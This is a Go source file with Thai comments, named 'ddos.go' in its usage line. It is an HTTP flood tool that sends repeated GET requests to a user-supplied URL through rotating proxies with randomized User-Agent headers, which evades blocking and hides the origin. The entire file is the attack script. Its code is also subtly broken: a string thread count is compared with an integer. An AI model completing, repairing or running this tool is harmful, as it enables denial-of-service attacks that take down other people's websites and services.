package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

// ฟังก์ชันสุ่ม User-Agent
func randomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	}
	return userAgents[rand.Intn(len(userAgents))]
}

// ฟังก์ชันส่งคำขอ HTTP
func sendRequest(client *http.Client, targetURL string, wg *sync.WaitGroup) {
	defer wg.Done()

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// เพิ่ม User-Agent แบบสุ่ม
	req.Header.Set("User-Agent", randomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// อ่านข้อมูลจาก Response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	fmt.Printf("Response from %s: %d\n", targetURL, resp.StatusCode)
	fmt.Println(string(body))
}

func main() {
	// กำหนดค่าเริ่มต้น
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 5 {
		fmt.Println("Usage: go run ddos.go <URL> <TIME> <THREADS> <PROXY_FILE>")
		return
	}

	targetURL := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2] + "s")
	threads := os.Args[3]
	proxyFile := os.Args[4]

	// โหลด Proxy จากไฟล์
	file, err := os.Open(proxyFile)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return
	}
	defer file.Close()

	var proxies []string
	for {
		var proxy string
		_, err := fmt.Fscanf(file, "%s\n", &proxy)
		if err != nil {
			break
		}
		proxies = append(proxies, proxy)
	}

	// สร้าง Goroutines
	var wg sync.WaitGroup
	timeout := time.After(duration)

	for {
		select {
		case <-timeout:
			fmt.Println("Test completed.")
			return
		default:
			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func() {
					// ใช้ Proxy แบบสุ่ม
					proxy := proxies[rand.Intn(len(proxies))]
					proxyURL, _ := url.Parse(proxy)
					client := &http.Client{
						Transport: &http.Transport{
							Proxy: http.ProxyURL(proxyURL),
						},
					}
					sendRequest(client, targetURL, &wg)
				}()
			}
			wg.Wait()
		}
	}
}
